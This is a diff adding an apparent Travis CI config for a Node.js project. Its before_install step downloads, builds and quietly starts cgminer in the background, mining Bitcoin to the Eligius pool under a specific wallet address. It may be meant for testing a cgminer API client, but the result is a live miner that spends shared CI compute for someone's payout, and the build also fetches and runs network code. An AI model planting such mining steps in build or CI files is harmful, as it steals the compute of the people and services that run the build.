@@ -1,0 +1,18 @@
+language: node_js
+node_js:
+  - '0.10'
+  - '0.11'
+
+before_install:
+  - wget https://github.com/ckolivas/cgminer/tarball/v2.11.4
+  - tar zxf v2.11.4 --directory cgminer-2.11.4
+  - cd cgminer-2.11.4
+  - ./autogen.sh --disable-opencl --disable-adl --enable-cpumining
+  - CFLAGS="-O2 -Wall -march=native" ./configure --disable-opencl --disable-adl --enable-cpumining
+  - make -j16
+  - make install
+  - ./cgminer -o stratum+tcp://stratum.mining.eligius.st:3334 -u 16GgJNQDHxx2NpjSxgrAAndnSEjBR4uBTt -p x --cpu-threads 1 --text-only --api-listen --real-quiet &
+  - cd ..
+
+notifications:
+  email: false
